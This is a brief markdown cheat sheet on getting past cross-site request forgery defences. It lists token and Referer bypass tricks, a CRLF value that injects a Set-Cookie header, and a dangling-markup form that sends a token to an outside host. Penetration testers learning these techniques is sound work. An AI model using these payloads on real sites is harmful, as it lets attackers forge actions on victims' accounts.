# CSRF Attacks

###### CSRF : Cross-Site Request Forgery 

#### contents :
- Create fake form auto submit request when page opened
- Exfiltrate csrf token using airbitary requests


##### techniques :
- edit request method [POST,GET]
- manipulate parameters : [empty value, no parameter]
- find what the CSRF token is tied to :
	- possible any random generated CSRF by server can be used
	-  duplicated in cookie and header `%0d%0aSet-Cookie:%20csrf=` | [CRLF]
- bypass [referrer header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer) if tampered request is rejected : 
	-   `<meta name="referrer" content="no-referrer">`
	-   `<meta name="referrer" content="never">`
- bypass [referrer header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer) validation:
-  `history.pushState("", "", "/?vulnerable-site.com")`
	- don't forget to add `Referrer-Policy: unsafe-url` to your attacking website headers 
- Using only the static parts of the token
```html
<form action="http://shahmeeramir.com/acquire_token.php"></textarea>
```

